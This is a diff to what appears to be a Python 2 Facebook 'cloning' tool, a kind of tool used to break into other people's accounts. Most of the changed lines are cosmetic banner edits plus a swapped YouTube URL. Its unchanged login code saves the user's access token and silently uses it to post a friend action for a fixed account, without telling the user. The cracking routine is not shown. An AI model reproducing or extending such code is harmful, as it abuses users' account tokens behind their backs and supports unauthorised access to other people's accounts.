@@ -67,7 +67,7 @@ logo = """
 \033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
 \033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Saqlain khan And Huzaifa Pathan
 \033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96    Huzaifapathan\033[1;95m♡╰──────────•◈•──────────╯♡""" 
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96  Huzaifa Pathan\033[1;95m♡╰──────────•◈•──────────╯♡""" 
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -94,7 +94,7 @@ print  """
  \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
   \033[1;96m ─────────────•◈•──────────  
    \033[1;92m███████▒▒Welcome To Huzaifi and Saqli Bhai▒▒████████
-\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96  Saqlibhai\033[1;95m♡╭──────────•◈•──────────╮♡
+\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96   Saqlibhai\033[1;95m♡╭──────────•◈•──────────╮♡
 \033[1;94mAuthor\033[1;91m: \033[1;91     King creations
 \033[1;94  saqlibhai\033[1;91m: \033[1;91▒▓██████████████]99.9
 \033[1;94mFacebook\033[1;91m: \033[1;91  Saqli king
@@ -169,7 +169,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful...'
-				os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://m.youtube.com/channel/UCHBt-powBjV76py7QRuYhhg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -216,7 +216,7 @@ def menu():
 	print "  \033[1;95m«-----♡----\033[1;93mLogged in User Info\033[1;95m----♡-----»"
 	print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "
-	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96saqlibhai\033[1;95m♡─────────•◈•─────────♡"
+	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96  saqlibhai\033[1;95m♡─────────•◈•─────────♡"
 	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
 	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
 	pilih()
